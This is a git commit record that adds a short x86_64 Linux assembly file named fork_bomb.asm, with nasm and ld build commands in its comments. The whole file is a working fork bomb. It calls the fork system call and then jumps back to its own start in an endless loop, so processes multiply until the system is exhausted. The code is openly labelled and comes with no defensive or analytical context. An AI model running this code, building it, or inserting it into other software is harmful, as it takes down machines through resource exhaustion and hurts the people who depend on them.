4a56a67e7af91bec0afbeebb23b2c345e0b066f3
MMxM <mmedeiros450@gmail.com>
2015-08-29 13:01:03 -0300

    fork bomb for linux x86_64

---
+++ fork_bomb.asm
@@ -0,0 +1,13 @@
+; coded by mmxm
+; nasm -f elf64 fork_bomb.asm
+; ld -o fork_bomb fork_bomb.o
+
+section .text
+  global _start
+_start:
+   xor rax, rax
+   mov al, 57 ; sys_fork
+   syscall
+
+   sub rcx, 7 ; the rip is copied to rcx and r11, after execute a syscall
+   jmp rcx ; decreasing 7 from rcx = location of (xor rax, rax), then jump
